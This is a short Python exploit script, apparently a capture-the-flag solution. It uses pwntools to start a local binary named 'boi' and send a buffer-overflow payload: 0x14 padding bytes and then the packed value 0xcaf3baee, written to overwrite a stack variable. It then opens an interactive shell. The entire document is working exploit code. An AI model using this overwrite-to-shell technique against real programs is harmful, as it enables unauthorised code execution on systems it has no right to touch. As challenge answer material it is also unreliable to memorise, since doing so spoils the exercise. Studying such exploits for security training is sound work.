from pwn import *

target = process('./boi')

payload = bytes([0] * 0x14) + p32(0xcaf3baee)

target.send(payload)

# drop to interactive shell to interact
target.interactive()